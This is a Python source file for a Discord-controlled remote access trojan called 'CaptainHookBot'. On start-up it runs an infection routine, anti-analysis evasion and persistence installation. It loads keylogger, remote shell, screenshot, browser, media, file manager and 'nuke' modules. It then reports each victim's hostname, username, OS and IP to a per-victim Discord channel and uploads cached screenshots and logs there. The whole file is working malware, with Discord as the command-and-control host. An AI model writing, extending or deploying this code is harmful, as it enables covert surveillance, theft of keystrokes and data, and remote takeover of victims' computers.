import asyncio
import discord
from discord.ext import commands
import os
import sys
import aiohttp
import io
import socket

from src.client.core.config import Config
from src.client.core.platform import Platform
from src.client.core.security import AntiAnalysis, Elevation
from src.client.core.persistence import Persistence
from src.client.core.cache import OfflineCache
from src.client.core.wraith import WraithEngine

class CaptainHookBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix=Config.COMMAND_PREFIX, intents=intents)
        self.session_channel = None
        self.offline_cache = OfflineCache()
        self.wraith = WraithEngine()
        self.is_connected = True

    async def setup_hook(self):
        # 0. Wraith Melt (Initial Infection & Persistence)
        try:
            self.wraith.melt()
        except Exception as e:
            print(f"Wraith Melt failed: {e}")

        # 1. Security Check
        if AntiAnalysis.check_all():
            print("Anti-Analysis check triggered. Exiting.")
            sys.exit(0)

        # 2. Persistence Install
        try:
            Persistence.install()
        except Exception as e:
            print(f"Persistence installation failed: {e}")

        # 3. Load modules
        modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
        for module in modules:
            try:
                # Use absolute import path for stability
                await self.load_extension(f"src.client.modules.{module}")
                print(f"Successfully loaded module: {module}")
            except Exception as e:
                print(f"Failed to load module {module}: {e}")
                # Try fallback for bundled environments
                try:
                    await self.load_extension(f"modules.{module}")
                    print(f"Successfully loaded module (fallback): {module}")
                except Exception as e2:
                    print(f"Fallback loading for {module} failed: {e2}")
        
        # 4. Start Heartbeat
        self.loop.create_task(self.connectivity_heartbeat())

    async def connectivity_heartbeat(self):
        """Monitor connection and dump cache upon reconnection."""
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get("https://discord.com", timeout=10) as resp:
                        if resp.status == 200:
                            if not self.is_connected:
                                self.is_connected = True
                                print("Reconnected to Discord.")
                                # Stop Offline Ears if it was running
                                media_cog = self.get_cog("Media")
                                if media_cog:
                                    media_cog.siren.stop_offline_ears()

                                if self.session_channel:
                                    await self.process_offline_cache()
                except Exception as e:
                    if self.is_connected:
                        self.is_connected = False
                        print(f"Disconnected from Discord: {e}")
                        # Start Offline Ears
                        media_cog = self.get_cog("Media")
                        if media_cog:
                             self.loop.create_task(media_cog.siren.start_offline_ears())
                
                await asyncio.sleep(60)

    async def get_or_create_session_channel(self):
        """Finds or creates a dedicated channel for this session."""
        if self.session_channel:
            return self.session_channel

        try:
            guild_id_str = Config.GUILD_ID.strip()
            if not guild_id_str or "[[" in guild_id_str:
                print("Invalid Guild ID in config.")
                return None
            
            guild_id = int(guild_id_str)
            guild = self.get_guild(guild_id)
            
            if not guild:
                # Fallback: try to get from guilds cache directly
                guild = discord.utils.get(self.guilds, id=guild_id)
                if not guild:
                    print(f"Could not find guild with ID {guild_id}. Available guilds: {[g.name for g in self.guilds]}")
                    return None

            user_name = "unknown"
            try:
                user_name = os.getlogin().lower()
            except:
                import getpass
                user_name = getpass.getuser().lower()

            channel_name = f"hook-{socket.gethostname().lower()}-{user_name}"
            channel_name = channel_name.replace(" ", "-").replace(".", "-")

            # Try to find existing channel
            channel = discord.utils.get(guild.text_channels, name=channel_name)
            
            if not channel:
                try:
                    channel = await guild.create_text_channel(channel_name)
                    print(f"Created new session channel: {channel_name}")
                    await channel.send(f"⚓ **New Session Established**\n**OS:** `{Platform.get_system_info()['os']}`\n**User:** `{user_name}`\n**IP:** `{socket.gethostbyname(socket.gethostname())}`")
                except Exception as e:
                    print(f"Error creating channel: {e}")
                    return None

            self.session_channel = channel
            return channel
        except Exception as e:
            print(f"Unexpected error in channel creation: {e}")
            return None

    async def process_offline_cache(self):
        """Decrypt and upload all files from the offline cache."""
        pending_files = self.offline_cache.get_pending_files()
        if not pending_files or not self.session_channel:
            return

        await self.session_channel.send(f"🔄 **Reconnected!** Sending {len(pending_files)} cached logs...")

        for file_path in pending_files:
            try:
                decrypted_content = self.offline_cache.decrypt_file(file_path)
                if decrypted_content:
                    name = os.path.basename(file_path)
                    if any(x in name for x in ["screenshot", "camshot", "screen"]):
                        discord_file = discord.File(io.BytesIO(decrypted_content), filename=name.replace(".cache", ".png"))
                        await self.session_channel.send(f"📸 Cached Image:", file=discord_file)
                    else:
                        text_content = decrypted_content.decode(errors='replace')
                        await self.session_channel.send(f"📄 **Cached Log:**\n```\n{text_content[:1800]}\n```")
                
                os.remove(file_path)
            except Exception as e:
                print(f"Error processing cache file {file_path}: {e}")

    async def on_ready(self):
        print(f"Logged in as {self.user.name}")
        await self.get_or_create_session_channel()
        self.ensure_environment()
        if self.is_connected:
            await self.process_offline_cache()

    @commands.command(name="p")
    async def _ping_test(self, ctx):
        """Hidden test command to verify bot is alive without cogs."""
        await ctx.send(f"⚓ **Hook is Alive!**\n**Host:** `{socket.gethostname()}`\n**Modules Loaded:** `{len(self.cogs)}`")

    def ensure_environment(self):
        appdata = Platform.get_appdata_path()
        own_path = os.path.join(appdata, Config.OWN_DIR_NAME)
        logs_path = os.path.join(own_path, Config.LOGS_DIR_NAME)
        
        for path in [own_path, logs_path]:
            os.makedirs(path, exist_ok=True)

async def main():
    token = os.environ.get("DISCORD_TOKEN", Config.DISCORD_TOKEN)
    if "PLACEHOLDER" in token:
         return

    bot = CaptainHookBot()
    async with bot:
        await bot.start(token)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
